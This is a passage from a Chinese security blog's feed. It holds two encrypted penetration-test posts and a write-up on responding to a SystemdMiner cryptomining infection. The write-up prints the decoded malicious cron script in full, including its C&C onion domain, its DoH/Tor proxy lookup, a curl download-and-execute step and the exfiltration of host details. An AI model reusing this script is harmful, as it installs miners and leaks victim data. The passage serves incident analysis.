3e3eedca8d2385cba3083ecce93afa2654a228ee9e6c213f07fc96472fd04ca542f2631dddb15c7069bfd86bd16a8644fd143610cf26e54c61fcb0563a25b1ca3cd82b14608e7838fd3797736c5ff43155a6c6b151afd834b54e8d5977c1bae0d1c7151f2c577ac1d2501dba3fd867ad5ef7ad857f918daaf5aa51ec520ea7d1b9c42cc8bd0b42391c254f821f4f9b6deb61ed4aa92d3f5d3944a36bf9a53c3b837b1b84887a84c9cf14ea8db13e0c1c2cf71ff1b0a97d869117f5122e32db3898c455fd660b2c66ff9e96b95a812770fc8b77b80fa25a873743eab9299d3f8b38e859e8a7928b8f843184e01944eba0e14782969dabff11e29f47956b40f54a2bdddc86c34b04fb523b4e4c9a7e8ac0b7886386a7d40edcd6efe3187560eaf7130062f2f6430036352b1f510b4cac755da3603249c108a270791bd9b77da95c4129978a2a5771370e60f4ac54022b2636e77c7d8b1e069d51823ce33c96842d56b6945697f2f807ec84afd2b722c291f246f7f4c40c113878b2cbc2876a3b5dd2af05cc1d6c4726d3871072e7e87daa0aaa79e41c3e3ff5b42404758fef2675b1f8064cd60b2b41fcc36792c82f646bfec5101f7fe140395a49987ec217023442b69fd578ef02b7334ca99b6833f61febcb3cfb5f64b7721acb762f08d8711ebc421e7d2ba990916b8e53d85ac97c43fd7e37fbc366a80b1c16a44bec81c32ef665d78d5d30413d2fa3ea67f03ae3e3bec51648173a3a2d8cb9df2c6ea383af0d6d88b45bd5ca1dc1963ef11100a5e8f2763e32ddea91f45137e1dd666217629f20b0de21cba16c2bb5b997447e2b00e9fdc809ec5c68d4be4b8d5ca221edee25fe4381c7bd3070741e955d73e8344dfd090cba585fc37a630a9a3728166100d6b0b0253c19b699c21991488b7dbedc8898e176ab84f6f233a6e6a0af77e26cbe42bc0e826c37819780f9d072d25f1ff903cfdef5868a7b4e80bd8055996cd5f5006cd74ee1bcda095edf6a5e4c6659ed092640674a78f90da5112be06e846606e15e78c37ab60ef7862fd5b4ef93e8bd49ed783b941c5093b99a21a521f35a48ac9d0a386295cd5c8bb67e1fa99a9a84890fdff262144122a78e8769edae6bb3bac030435040cc1c9eae8243633f91f4f080d682607716ee593f15f0eb73eaa96222010d382a16042809bcd970c54304be44ee11bfeef2aff3cfcca480676f1550283becacbf90c33d21868111f6336ad768d72104751ba1bad8fe67203df5679665b15418886c0cbffc52335fe50e954f08d9c7c93f564754a41c61ec4a247722e89438bc8ece1ff17f615c26c2c9d1cbcd71e1348e9fdec3ac984cfd1875e66793977a5df0c7b23d4d5bddf5bed3b1eaeb4bb49e6c24d59d430e809655e3e60189631af9eb4d2efc89ce5b864067ccc853ec536fe2e38305d95cbd602e36830b4154093e079f71ce52afa25736a1b4ac505eaeef0cf264f608ab259416f7de79c3cb1197652366ebc349721e6baea30fb48144bbe547175c3270e00b15caee4607a6a1519e0d35f1d80066ab962daa8f589955571521ee0314e74e4a0725695f495bdace92d9639e65398b01ef8a23fc3bd138c3680e8ba7116b2da157521ac06aa446467a2ddb366baddcf9625bb497dbe026f6a0f28cfa6193a88aec5a265045cb3ea0eee7f9d7ed2ee0c397bfca6892b908b53bfc3bad2639c6b28a0c316f895ce6e99152bcd92aef6d67be47846c71afa9068c7b0e27657e58818b3d32d1afe0261c9fce8c06166e6fc7e98546c3b2dbf00f27c7d32dfbcfa6cb95e492d450f1757868d2545e485c1b17d44b325f23f67b4aa337bea19cf43aef136ca643f9154a7cd95bc6cadfd648cb04418d06c26677ed388c70eec40e046fafa2325fb816c08a1bec1addbfd6110119e7a1bfc3858eff351b9d607074b2ea0b9ef993b53ea829aaab416a5216bfef419f3c8d452e615041ea35be25a2da6950b5a8e95b88f76c9997bba03c151010466dacd193ce3e302c97389d8f0c961af18ae856d9f6ff6289b7dfd701f14188fe8efd10204925235bbfb76449d1026795d5922a0f67b992993c5e9821d73d9b9798426139ec33bfc4dfa96e4e5ad2c7b785f83244a6d8ea20a3c6d9034d3f2742516c76a83fcad370827200bc170e13f9dde007db026c08fc20c39b91af3258488b7c95b346db86bfdd6ec86a60cd5ba0baa73261c817cc7fddfe319cb2728cb28ddc650fb0e9344aa42a4a1b695467d61877997675af3cbba53730bc190a291db6242d33e3f0ad20fe0c59aa1be23b28a69abd6ccb208f7cabfa7b89dec1c52c96115d40ac108eb5f777e0af8015677322b19d386f65ab8c564c9930aea2dcc33875b5f9e10f6d39d1dc80253ee1d511ee1c7548dd7a37fbf6b73499ad1ee3a1ff216bb3bf0ea4327c5f8f249d5aabda0c5364ba91b23c29eb771ddd54e2f18092d5d5287ce2409266c4a5cd18a7ba1320b74bc5bb17be6ca4044c30442ed0cd6f3cff27f2223f669f48e7927c933207ad9eec5a83cbbc091452f60cea57b511ee993a19cc84f9ba8db31da0881e749b84ec4ee1ccd3cf346dce6fa12f3765eecfd2a99ff8f2e5f3995c3cb7080f6f7de127f52e2750b28d2c8a3321fc63588f4d803f403ac5db241ca6783036d9a67b529df25c5f370d9c79626fef5cad17a03efb2075a4ee9eaa251afb0f85460f5fb552a6ead375f64061bb7237058564737ee9dcef5077d935e7594d9ffff06ddfcf5535e8d3f00ee4d78a70f0551a469b290af7b6c921a86ddb4108595bf6050379ba9c97ac904b5a5804dacd3c9b81c65b839db69d8dad438915a71c27df5bbbcbba6338629796f77121866dc1248af60989d8beb7c7599e3cd29b7c92a108c36b4c8cb20f9af7f321b2423fffdb48bbae2e7406bd5ed1c2c97570d5a877246a9220f59b9791c7a3d31f7c146b8ed6d9ddee87541a5c2c88bc6220da5b9511f8bfc2572eeafe26097adfc0cbaa53413dfc7db9e5dbb0361d01d82aa12a97d53b660e1a8df15e6289712de2fc56633c4e96dac708b058a214091b0946a3e090097c906ea7008f761d5e681eeed120f95114882e88d4121bebbba84c6699a7f1f898007687f39e4e4856603278d50fe3aa0933856b0279f5111206fe95ee9a257e6aeac57bce1401bbb7ed9fb970a5cfdd3ad2dea2800a5ab543c240725c0d80f3cb235dff10db1dea3748cc9b0386d2e789d752c7f817fa1cec18c400b27aa584014b9c584bf050c72c60e8429b8c03d9938088f94a7d77182540812547a3652a131ed1b3085b23d9cd517ab6212896bbb6f9ba3896debc54fda379ba1da63aa45847ca8ed5f5fa34d125823305bced7efda606f09c919e4dcba84b340ae2c495fcfc6336126ae31b1666f3ff86b6b339e5f3074f2360cc18a72ad4a6cdec603fbdc0664200058fd5504ee444544556395c5cd7fd28f56543dd37521716bee1dcc9aa9961c6c4ee3f557ab0646cff0ef2a6a834e49857a1400ef33cc4aed6d7aa0baa3be7e6fc15e0b15f9c91e8ef4e9c417823e6c3b5f64ef6dab98a2a8609857d31d7cfb8db6739c3cc805755be71604cb237b8ad82bc5443af0a86ae1609199819659953099b8b7324d1a3fa1cff64e8b73849f509e79e8eff96b1882a2aa97de593cd7e7a2fc6de76a6e928ff57fb78fd471633a32e4940287b710a36f2cf1103e1e6a08f8686595832e6cd6680e2d568bf4bc3149ebd1e2b9134aa8d10a253fa31ea75f9b661d478f140e27f9ffbf4bdfaa1f4fde2f3918c18ebe2d2e451fa6927988bfb97f45beca9a06b058e65ab4c92f4cd560c5d29392721f3a82a91804e6bbfc6757150c72555d3ac7dcae50cad8c461d1f48e5cbc0c80c6334ccc3eeea1883b66030452e8d0ed326241299b9c18bec08fe006612d0871b70867d7db532cae7b6346b42945b01275ee3c77f10ef39035c9bc19616b3fce1be056def94b04ba2ece155ad0700cfd0730b144a17408a087740a7f225d4c13664bb7d1b30b7014893d4dc3581eeae2c1f89820f95d3f46fb611b87dc08e472f95d11285555deab4bffa2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">Please input a password</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>征信诈骗Getshell-[Fastadmin]</title>
      <link href="/2023/01/10/%5BFastadmin%5D-%E5%BE%81%E4%BF%A1%E8%AF%88%E9%AA%97Getshell/"/>
      <url>/2023/01/10/%5BFastadmin%5D-%E5%BE%81%E4%BF%A1%E8%AF%88%E9%AA%97Getshell/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Password error, please try again" data-whm="Password error, please try again">  <script id="hbeData" type="hbeData" data-hmacdigest="414f6a2dc7e7a416b4242741fa737636d255434415903b4f3fa9234482d0d582">deaacd5f427b337a2d760129011f3d11200a1b2da57d74d3a5e507694cbd91fd4b37969e4e128456de77cd2065957ca4df5c9dc6991fe88e26db43564568547f5a76f7f6d4e6756614aeffa5b878c3c370351cc5194066047db5a8546e78f9d3efaabab73c016087d16f7d37db8bf6db22ea962de6c8bc07ee705f9a23e294b60d098eac5e26e6a7a8b33fe5e962d2542eea498bb7538a3454e57122d796e0b28f7b194a33ad5f558cdf7dd55e58803fa4c145fafd876e3dae561955dc4c3390211bb0a46b3e98b81998a63dc21c491c696684c1df713dcbb714282ac9f9932d605cbdf063d7f1eba02ef3ed17f6e278135407d3d3823543f14288b63a2a9c0cab309eeb50bb30cf4aa2714bca0451c96697584c66ac81a79b7db657bc54d843fcdb859ec30b8061becfd5cc5dfaef78389c2ca8af11212deb49cb6eb56b280e889a0b4e90da5558b88adddf1c92b89bfab187925ebfca0aed4038723379544b2de9b9e7c8d0ffc64464fa326de17257ad51f9a4f4d4c25d45050d4f936e915d2cf0a6233f9b539a5744f91fed7e065c613a38e2790c79bea49305ad1338ceab707b371270fb99432edf2a718d8193164c1597063ab08594e4398345ec7a2300740564c43ea13c0410fedb9d3001378acf4d21899079bd307e6d37d660f5c19ea1af6ca41545c61d13eac26538d460206b77eee891d5cf4599e168a346282b4f8673c85d53c3d8aeffdb52819fd02c63812931e56d64a5fab191bd8c9a8c2223c162ccd46ffc746f67e485417721be68beb02600c59e7157a109bd040e22e139e8874605ef7439e52fcec35140e143f6dee3fcda48f45346a1a5b0b56cfe10749d4bc2ae27c964b1853e50a979fc716fad8e88f53e6b9c008574f1afd1b0e3784537293b7786b0e3a70e19ffe8ce27c263777578208f5fa44f1198a686ea6e4bfbadf888f6c203be230f289b4ce49921c5a9c5d76c502dd3fd45ae26f374335112c9379bde14fbafa05e37b653933ac74635d1461d348f44350f584c8722430c7381b85aa2cfd41c1bbd1078a385d397eaa256b9ef2ed31c8e3982293aaf4db95ac83ec6a1cf2a7126eb0ba1ab3d87c8581053c1cbd00f8d00128e9e6417ca104b5fa889c19b453ff4f08577426b285d734be43d5d654ef14b15b9b034d0ceddf7db1ca63c458c160ce4367f050afcd5d4ed3094830fd09ea29083b97e13792c94f21f5766522dafee79d1016853c5bd868920234f58c61f3cd576eae9f84d82b302593beb43ac21ba827fc2e955724fbd7921193741fc615405a9e4b9b59e353cb0d0ca2fdb20ee943c85078346c0bddcb4479ae269e71eeadad209754d5bd383fb6fb5deb94070651f3b7adefc6b14c0b09d58de3da67e93a6560005a34cb142a24e0683a13f1e3a2e3eb25f98b31b1e4e41f0a0402add9b2046e6441e6b41b86714b5fedb86a002309e1205285a3134e5eca0a09d5c99397bb6719e365a6939e6d85ac0eb1f921f3b20d4836ab329758008fe248c4b4d2770eefad0ff8622385880d07dcd1b582197796a3060f080ce859e15790bd0c0cd487d374aa40541349d05e7464bc7b67439bbe687db33b235ce73d16271881576717e196cc0a50a66f0ef2b94a897961bf7aa6fdb46a191d32fda7e301ef14bb732b083b4debc57173c02b753f77d02658340a96f99ec5b4484d187c9445262ba583fd61e0b8855ac0779bce11cfecd2a5e464def746ebd5ee71bf32a2be046f426ecd2e1e950fff7df27b3001163b5fa14dd83db5b47e4c124f003b3ba9fa41a6c541fcdafaf34247e936ebfc6ddc24abd952cdef047d66255372a837485a803b1da6176cd4f5c08688de564151088504276792b391d40e61460d6a6c06629be62e0a05d022fff8667d6b75d5c1715443589a5686dd1301bf52703d22b5b8078d8dde251b4ddf6758d99fa0844ab7cc775914a3d14da08ca899ea30cf7f7044f931775e8fd55d68207fe6e63bb33e6f153dda30a144fe9441c193056dded70cc7a55346ce7e0d259d6ef68d578a5bd46f563fa5038afe017b44c887baaac4dae6c008b65dd5530618a2c4266908679bc7dc8b035c7c8a7a8ee2f4d14f73dbe9d853249436290deac851387e06fd6355d5a2335597da7e2686695ee45e57800ebe2bca3667aee8cb262935e95b22a37fce9c9973ce5ea3bb2d06a2e2b4d62f89a0eb972ef2b8a6063a3215dc0986d0b3c7b2c1b671208cbbc6c223940246f44044d20d52fbfb60acea55329c9885974420c06bd5eb8c0b4ec9a663e901845163a8deb6d225eb4886924a3a1c9acffb63bb9b977e4bb42a58602eab195f94a196e474bfbd09463af2bf5a26a97994839b901e1acceada5ccc09aa3fa2f6b4133402f7670bf00d833a99c59d25c73c5a246356a479d2f9b6950c022bbff58ec6956599fbaeb2c2b8e94722f65d66f7092eb5c53e7a464dc5a160841fea560552811739d84550a4ccde7afad873243468d5aaaa984f727de2894d1afcdb781da5a1acaa5c5e4f18eda5424083ef40bd1792822267234b05e087e92ec56a8f6466c1c73b5a53181b6aa1b0ee04b674ae5ee24096d90a7b68eaee6570553e96b57a99ac85546d83636c0990b4107fd461cf296a6f15fc12bbe64ddf6f4b56993071d29f4db6299995aa9ed0395272b18df1d120021fc2001c03b557d2fd12affef83b2c8549621b143f87073503f6b1e335e45e86b36b7edaacc9b1d34313fffc5b1858d2294d4517748cc2ae44a833e345abaf24017c7733a94da0bc8e069ebdbdc1ddea0b60c2e7ec99809151779a4c0bfa19065414bb3ca87cc1fad4e90ed20d88efccd58f3ff14a2eb0696d23e5373028736f7a6966dd75469f2ebe117051fcaf5ec196500c443cda691533472edd40f80ab4c5b6d72d221405d9f059c26e4809a6696c5a8589a75329456d346ead79a2a58c430d1fe312369d990e496950d392c2697db5dcd6d97875f673a7b4b8cc1f3034d21bdf516feaf02feb289df80f17b697378d6438c9e2d1ce19a2fc7589ad9a6ea2e2eb51dd4f635c30921c46f14dbce24d5ad1f6aaec80b1a771a2b963e4af7158dd4c6b8546dbb5b6763a3b2fba6d1a2cf695a7a8de1a49957458b2e78db3e5ebba6bfe5faccf4ed2ab97cedd1a09d38fb4c1e23edc9a07070b9821f37b4cef93f8614bede8e13f9d0268328fe9e4731f54a6b1d3a9a21e3a4d176f8d52b4942db67fa383bc842f47ca889032d397eea2627fbfddc4b02b8f18a1ff195a41be4b216ab4c5f463bc495bd82780b272e8325d38405b2bb70da47fff1d9731fb071a237b3fe12cd8694ad830a1b4ef351e05742f90bd467ff6d5d6f544e99112ccef294ba9dda5b6b86e56c4a666959facd682fe4d512dd794a31eedf808a2a0ac0a8b41649a327dd47bbcb209252cc41e1d39509c38b448a4d531507d2b7576afc1e476797320709e27dc1438d9a5b6c0c56796f544178ae397ecdded959e15c588717ad6a93584364218383f8a8bebd873f37229fa132a02c9eaa57691c9d835dfdf0aad58ee7bfee9090cf936c39306bf64e7cd40fa7658055cbb0ce96523cd5115054c588ff310ef81beec9f15ba82ea01c7f3a0734010f15cc0f8f9e43c8d854e586cfbda8342277a79ea36bdf562797e3e3c554e03b640602f3ac44c592e08c4f296abfa0e1daaead5c7226e63a02d4b03ca5895a7c6288b2a85d808bea29507e82376c521990981cde59009f7238eddaa2921a4e5bcea7787a83f0efbead134f3a315ef4e1373aa28d4c7c5230c66afbfa351270c6a2005b20524538eddf853377b788d3b265849c6955422dbfe889a30fc2df0c850ff8e73987a34de92ee5b10348fff467c171c41b8581843e020ce934b2d576d8e621235a0c60008f88cbcedba1ba068f961e37817fd3a6541d16ce2ad43d6bee31c7b8e7dac427504ec9ab3715e4624c8510d94c0f47c9d0fdd25da1fb98b265aae7aa42e0882e3b1c891cc431e0a9698e094bf7ba25176c8f03079c937c7470f441ab7640c6e731c616fcb9d6f2c3919ed38c74f7d4417793981697614ac1fce927528d049ed529ad93c1856ca80dad090030c053e8ba1ee00b98475bdd5aed3d0530f4bb07c6688517311992094aeb656dfd638ce980dc034224872f62648f6179020926dd38ecc72f9cb40a9750dc02cd53e7d9e2220129df01697a44576d6d555bea8775fcc5d09f624874caa1f6860909ce09a274838910413f5b27589b5ec298cedc81b795111528d330c0a06f7af9b8ca12268480dcc386faa8aceaf8d341e0edcae801e959988b12ad153daa09d84093e799d1586b381b4f19a88e32f3654e7463fc6e410851e4161c9536ee088cd5f63d4b9511fbc46b3db78a891b2dddf2fff519eb32700175fd6532227a719cf460512f6bc18fdb1ff5eea4e7177d75a4429f2e2e021dc90de402b2b905c252f078397c291b2ba1a1aa307de935bcd06e8dcc3b20a66e2cf6ef8c6ea9442368171e59c9433405bf7885a31dfec0fa5cd63ad7cba5d82855fff28dbadb3b94e7d0aa83c4ab2ce4f17b7c6bc4c8f1342a78789b9daa3fb61e69565cdcda38b345b4023aa5638d87c51806092c7326c1c45dca4b7b8f4a6cc9fbd0df49d9b3bc48c4ef8b092c3d0fcec6766418301c2edd41657331dfe8d91ef656a4e6ad36229b5e8f284ea9e3d15a479f17fc5145d8080d5a646677c94f652cf06e7071f09b6563644205daaaba79cdc5cfd48aa7322db0c565e19666eb3f82832ed9f03f394bc33e19ef1959110d59a0e3c2008077c8928b3aed52a2092f166507bd6c1328fb3cb05a7d8f849f7a589c562882362327c198548c1d5d6ddf1146411689e6265610e10701e5679bfe313d068226a33771b109951e407b52c0c687758913f04bd30f431b0bea0691483ff577c0e18e3b2f3d1e61ec91683a129049ebb112ff77850e1f5b3980608bdad2be3643af05463823ccba16228b4331b8689d55627b492139d87db8b8c1195e94ad5479c01882ce9d88dd8bc5a6c4516a52d83a37f9d5c995bc10b1a5002b4f52be61b61b248efe8e939dcf0d3994b27a31d5abd86f72d725dc89ed48dd70e0e3e6123d099e73e322dfc6bf92d6623ece3d2ec045b13c0d04c4ef55879170c559d0df1ed4e56143419c47a787b233b7039923db0b0a0b2bed93714c8494fba5bae56c0d2239458b492813c21ddf1d6a8fe158437f11d881bfccbc964332d70fe59cd341206a8e957f20d36977dfb16bacf01b87458bda1ac9cec52e5ea7757d65b8f2bb138f9e3109b273ecbd77fea2bed4883d9773d837734ae71f71e3df00c87a7336b11fbda387fa66cea11672bcdafea0805ceea33875234451f8f3b1bc01f8a2986f8f3d2ff0852fc4565e95149c68fe84611720c8bf91b06357e7e3aa0d4385e03215ea5b74fbf33e29e3cec9ff6b2ac0e0657639a7ef0b612685f2ea93b51d30416de068eec249eaa0c826cfb00bab267619fa61c3ab0df615fca2a29be3c3dea180a6131a060ad12945488c24304edd7e7284232bcde25c9704840c3eb83568221ca56155ab0e0d279affaa5479f29afcc935269756cb8b7f99625c662140deb97843e666027e79c22dbdb7e68813e746ce90ec7686fca51e390211e9e1b3bf7ad64dbbf7d34aed6d9e413b5eb760a27b8053db5a22da97bc13ad2643f8fe22568f8ac282a95188f9ae7ba23d002d58b60c047e14fe9482ea4849dd7817fa6913250dc4dda07125af0d11637074d1784633f22833f88cae62d4f3167160d7da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">Please input a password</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SystemedMiner挖矿木马分析与处置</title>
      <link href="/2022/04/01/%5B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5D-SystemedMiner%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%BD%AE/"/>
      <url>/2022/04/01/%5B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5D-SystemedMiner%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="SystemedMiner挖矿木马分析与处置"><a href="#SystemedMiner挖矿木马分析与处置" class="headerlink" title="SystemedMiner挖矿木马分析与处置"></a>SystemedMiner挖矿木马分析与处置</h1><p>最新补充：因为这类病毒涉及二进制知识较多，且自己水平有限，参考师傅们博客较多，可能会有哪些地方理解错误，还请各位师傅指正。</p><p>感谢一条咸鱼师傅的指正：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051053459.png" alt="image-20230405105350408"></p><hr><p>先登陆到208的主机去查看一下，查看下进程CPU使用率正常，并无挖矿迹象，可能是防火墙策略开启，木马连接不上矿池，先暂时隐蔽下来了</p><p><img src="https://img-blog.csdnimg.cn/5b94dbb173574f148127ec142ad0530d.png" alt="在这里插入图片描述"></p><p>（这里要注意的是区分系统进程和木马进程，因为很多木马的进程都是以随机字符名称出现的，例如<code>kswapd1</code>和<code>kswapd0</code>也比较类似，但是这两个进程是系统进程，所以不要混淆，其实如果挖矿进程在跑的话，很容易便会发现其进程PID和名称）</p><p>通常挖矿木马都会去写一个计划任务，来防止挖矿进程被删掉，这里看了一位大师傅的溯源分析，提到了cron在执行时，会读取三个地方的配置文件：一是<code>/etc/crontab</code>，二是<code>/etc/cron.d</code>目录下的所有文件，三是每个用户的配置文件，所以挖矿木马可能会有多个定时任务存在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5737ace0b3e1468d9ac24c8e398032d7.png" alt="="></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron.d/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0be838e0c532462496ba71d9d48dafd3.png" alt="在这里插入图片描述"></p><p>果然存在两个定时任务，查看一下里面的内容两个文件内容一致，且内容为base64编码，先对其进行解码处理，而且<code>virustotal</code>判断为恶意文件</p><p><img src="https://img-blog.csdnimg.cn/1e8eff71f11b4683a9718ac7b25b5d38.png" alt="在这里插入图片描述"></p><p>分析一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">uMjSD9OaH5uA4C3CCjD4q2XEwo1s0H0</span><br><span class="line">exec &amp;&gt;/dev/null #不输出出错和输出信息</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取当前用户的家目录</span></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取执行命令</span></span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C域名为fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.*</span></span><br><span class="line">t=$(echo &quot;fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)#代理域名relay.tor2socks.in</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在几个目录路径里寻找一个有读写权限的路径</span></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-) #用当前时间生成 md5 码</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)#crontab计划任务执行</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载病毒母体，随机方式进行命名，通过socket5的方式用relay.tor2socks.in代理访问C&amp;C域名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x#运行后删除病毒文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查木马是否存在，若不存在则调用fexe测试执行，接着调用u <span class="variable">$t</span>.<span class="variable">$h</span> 进行木马文件的下载</span></span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看进程状态，若没有继续下载木马</span></span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p><code>sockz()</code>函数通过<code>doh</code>查询IP，通过这种方法既可以提供加密保护dns查询结果，又可以绕过各大厂商IDS里恶意域名的IOC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.pub/dns-query?name=relay.tor2socks.in</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/66340f3d765e42348c439edac0d21733.png" alt="在这里插入图片描述"></p><p>经过分析，这个样本的执行的总体流程如下：</p><ol><li>doh解析域名获取tor代理IP</li><li>查找目标主机可读写的路径</li><li>通过tor代理在C&amp;C服务器上下载与目标主机硬件版本相匹配的恶意文件</li><li>开启crontab计划任务并执行</li><li>根据pid文件返回脚本执行结果并进行判断</li></ol><p>根据这个样本的特征查了下资料，发现和<code>SystemdMiner</code>挖矿木马比较类似，特点如下：</p><ul><li>访问带有<code>tor2web、onion</code>字符串的域名</li><li>在/tmp目录下有<code>systemd*</code>的文件</li></ul><p>并且这个<code>SystemdMiner</code>是一个变种，除了更新了C&amp;C域名，使用socks5代理的方式访问C&amp;C域名从而实现绕过安全网关的目的，其余的特征与以往其他版本类似，通过上面的分析，知道该脚本会创建一个<code>/tmp/.X11-unix/</code>文件夹，里面存放着的是进程PID</p><p><img src="https://img-blog.csdnimg.cn/0631b8105a4f48e780c3d51a624efba0.png" 